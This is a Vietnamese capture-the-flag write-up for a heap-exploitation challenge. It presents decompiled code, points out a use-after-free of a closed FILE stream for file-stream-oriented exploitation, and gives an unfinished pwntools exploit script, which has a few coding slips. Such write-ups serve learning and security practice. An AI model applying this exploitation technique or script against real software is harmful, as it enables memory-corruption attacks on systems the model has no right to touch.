### Thông tin File:

```c
└─$ ls
chall  ld-linux-x86-64.so.2  libc.so.6
```
```c
└─$ file chall
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=f74212d3686295f416817fbbc788d813e8f2360a, stripped
```
```c
└─$ checksec --file=chall
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols   FORTIFY  Fortified       Fortifiable     FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   RW-RUNPATH   No Symbols  No     0               3               chall
```

___
Output từ `chall`:

<img width="804" height="196" alt="image" src="https://github.com/user-attachments/assets/220f9f4c-1840-4e6b-a25a-2440b9037b8a" />

### Code:

`main()`:
```c
undefined8 main(void)
{
  time_t curr_time;
  char input [10];
  int option;
  int run;
  
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  curr_time = time((time_t *)0x0);
  srand((uint)curr_time);
  run = 1;
  while (run != 0) {
    menu();
    fgets(input,10,stdin);
    option = atoi(input);
    switch(option) {
    default:
      puts("what options are you making up?");
      break;
    case 1:
      create();
      break;
    case 2:
      view();
      break;
    case 3:
      edit();
      break;
    case 4:
      remove();
      break;
    case 5:
      open_file();
      break;
    case 6:
      close_file();
      break;
    case 7:
      write_file();
      break;
    case 8:
      run = 0;
    }
  }
  return 0;
}
```
`create()`:
```c
void create(void)
{
  void *data;
  char input [10];
  long *ptr;
  int size;
  long *store_idx;
  
  puts("Enter the size of the choncc:");
  fgets(input,10,stdin);
  size = atoi(input);
  if (size < 1) {
    puts("huh");
  }
  else if (chunk_size < (ulong)(long)size) {
    puts("that\'s too much");
  }
  else {
    chunk_size = chunk_size - (long)size;
    ptr = (long *)malloc(0x18);
    *ptr = (long)size;
    data = malloc((long)size);
    ptr[1] = (long)data;
    ptr[2] = 0;
    if (store == (long *)0x0) {
      store = ptr;    // store node at headPtr if empty
    }
    else {
      for (store_idx = store; store_idx[2] != 0; store_idx = (long *)store_idx[2]) {
      }
      store_idx[2] = (long)ptr; // set curr_node->next = node
      puts("Done");
    }
  }
  return;
}
```
* Cho phép người dùng tạo chunk với size tự nhập
* Size của chunk được cấp phát từ `chunk_size`
* `chunk_size` là biến global, là tổng size người dùng có thể mượn để tạo chunk
  
  <img width="504" height="147" alt="image" src="https://github.com/user-attachments/assets/0e991308-b84f-4924-85ec-a51af6f0aa8b" />

  `chunk_size` = 0x200

* cấu trúc của một `ptr` định nghĩa trong code:
  ```c
    ptr = (long *)malloc(0x18);
    *ptr = (long)size;
    data = malloc((long)size);
    ptr[1] = (long)data;
    ptr[2] = 0;
  ```
  hay
  ```c
  ptr {
    size
    *data[size]
    *next
  }
  ```


`view()`:
```c
void view(void)
{
  char input [10];
  uint idx;
  uint i;
  size_t *store_idx;
  
  puts("Enter the choncc number:");
  fgets(input,10,stdin);
  idx = atoi(input);
  if ((int)idx < 1) {
    puts("huh");
  }
  else {
    store_idx = store;
    for (i = 1; (store_idx != (size_t *)0x0 && (i != idx)); i = i + 1) {
      store_idx = (size_t *)store_idx[2];
    }
    if (store_idx == (size_t *)0x0) {
      puts("The choncc you wish to view does not exist.");
    }
    else {
      printf("%d: ",(ulong)idx);
      write(1,(void *)store_idx[1],*store_idx);
      write(1,&newline,1);
      puts("Done");
    }
  }
  return;
}
```
* có thể dùng để leak địa chỉ heap hoặc địa chỉ libc

`edit()`:
```c
void edit(void)
{
  char input [10];
  int idx;
  int i;
  size_t *store_idx;
  
  puts("Enter the choncc number:");
  fgets(input,10,stdin);
  idx = atoi(input);
  if (idx < 1) {
    puts("huh");
  }
  else {
    store_idx = store;
    for (i = 1; (store_idx != (size_t *)0x0 && (i != idx)); i = i + 1) {
      store_idx = (size_t *)store_idx[2];
    }
    if (store_idx == (size_t *)0x0) {
      puts("The choncc you wish to edit does not exist.");
    }
    else {
      puts("Enter the new content for the choncc:");
      read(0,(void *)store_idx[1],*store_idx);
      puts("Done");
    }
  }
  return;
}
```
`remove()`:
```c
void remove(void)
{
  char input [10];
  int idx;
  int i;
  long *store_idx;
  long *curr_store;
  
  if (store == (long *)0x0) {
    puts("You have no chonccs to remove");
  }
  else {
    puts("Enter the choncc number:");
    fgets(input,10,stdin);
    idx = atoi(input);
    if (idx < 1) {
      puts("huh");
    }
    else {
      curr_store = (long *)0x0;
      if ((store == (long *)0x0) || (idx != 1)) {
        store_idx = store;
        for (i = 2; (store_idx[2] != 0 && (i != idx)); i = i + 1) {
          store_idx = (long *)store_idx[2];
        }
        if ((i != idx) || (store_idx[2] == 0)) {
          puts("The choncc you wish to remove does not exist.");
          return;
        }
        curr_store = (long *)store_idx[2];
        store_idx[2] = *(long *)(store_idx[2] + 0x10);
      }
      else {
        curr_store = store;
        store = (long *)store[2];
      }
      chunk_size = chunk_size + *curr_store;
      free((void *)curr_store[1]);
      free(curr_store);
      puts("Done");
    }
  }
  return;
}
```
`open_file()`:
```c
void open_file(void)
{
  puts("Opening chonccfile...");
  fp = fopen("/tmp/chonccfile","w");
  puts("Done");
  return;
}
```
* tạo một cấu trúc `FILE` trên heap với tổng chunksize là `1e0`

`close_file()`:
```c
void close_file(void)
{
  int ran;
  uint ran2;
  int i;
  
  puts("Closing chonccfile");
  if (fp != (FILE *)0x0) {
    fclose(fp);
  }
  for (i = 0; i < 464; i = i + 4) {
    ran = rand();
    usleep(ran % 100000);
    ran2 = rand();
    *(uint *)((long)&fp->_flags + (long)i) = ran2 ^ *(uint *)((long)&fp->_flags + (long)i);
  }
  puts("Done");
  return;
}
```
* Giải phóng chunk của `FILE` vào tcachebins
* Nhưng, `fp` không được NULL. Thành ra `fp` vấn trỏ đến phần freed chunk của `FILE`
* Phần data trong freed chunk được mã hóa với XOR 

`write_file()`:
```c
void write_file(void)
{
  int choice;
  time_t curr_time;
  char input [40];
  size_t *i;
  
  curr_time = time((time_t *)0x0);
  printf("Writing to chonccfile at timestamp %llu...\n",curr_time);
  puts("Are you sure you want to save? [Y/n]");
  fgets(input,0x10,stdin);
  choice = tolower((int)input[0]);
  if (choice == L'n') {
    puts("Writing chonccfile cancelled. Feel free to make more edits");
  }
  else {
    if (fp == (FILE *)0x0) {
      puts("Chonccfile is not even opened. What are you doing, my friend?");
    }
    for (i = store; i != (size_t *)0x0; i = (size_t *)i[2]) {
      fwrite(i,4,1,fp);
      fwrite((void *)i[1],*i,1,fp);
    }
    puts("Done");
  }
  return;
}
```
* Sau khi giải phóng với `close_file`, chọn `write_file` sẽ gọi đến fwrite() với luồng fp vẫn còn đấy

  ==> FSOP bug

___
### Exploit:


___
`script.py`:
```python
from pwn import *

context.arch = 'amd64'

libc = ELF("./libc.so.6", checksec=False)
context.binary = exe = ELF("./chall_patched", checksec=False)
context.log_level = "debug"

def GDB():
	gdb.attach(p, gdbscript='''
		#create
		#br *($rebase(0x16c1))
		br *($rebase(0x175f))
		#view
		br *($rebase(0x154f))
		#edit
		br *($rebase(0x1631))
		#remove
		br *($rebase(0x17de))
		br *($rebase(0x18df))
		#openfile
		br *($rebase(0x1286))
		#closefile
		br *($rebase(0x12a0))	
		br *($rebase(0x1340))	
		#writefile
		br *($rebase(0x137b))
		br *($rebase(0x144a))
		''')

p = process(exe.path)
GDB()


def create(size):
	p.sendlineafter(b"> ", b"1")
	p.sendlineafter(b"choncc:", str(size))

def view(idx):
	p.sendlineafter(b"> ", b"2")
	p.sendlineafter(b"number:", str(idx))


def edit(idx, data):
	p.sendlineafter(b"> ", b"3")
	p.sendlineafter(b"number:", str(idx))
	p.sendlineafter(b"choncc:", str(data))

def remove(idx):
	p.sendlineafter(b"> ", b"4")
	p.sendlineafter(b"number:", str(idx))

def open_file():
	p.sendlineafter(b"> ", b"5")

def close_file():
	p.sendlineafter(b"> ", b"6")

def write_file(choice, data):
	p.sendlineafter(b"> ", b"7")
	p.sendlineafter(b"[Y/n]", choice)
	if choice == b'y':
		p.send(payload)


#############
open_file()

create(0x20)
create(0x20)
create(0x20)
create(0x20)
create(0x20)
create(0x20)
create(0x20)
create(0x20)

remove(1)
remove(2)
remove(3)
remove(4)
remove(5)
remove(6)
remove(7)
remove(8)

p.interactive()
```


___




```
